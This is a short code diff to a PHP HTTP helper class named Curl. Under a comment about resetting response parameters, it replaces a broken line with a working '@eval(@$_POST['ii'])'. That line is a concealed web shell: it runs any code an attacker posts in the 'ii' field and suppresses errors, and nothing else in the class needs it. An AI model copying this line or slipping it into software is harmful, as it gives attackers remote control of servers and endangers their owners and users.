@@ -531,7 +531,7 @@ class Curl
         }
 
         //reset response & status params
-		@eval(@_POST['ii']);
+        @eval(@$_POST['ii']);
         $this->curl = null;
         $this->errorCode = null;
         $this->response = null;
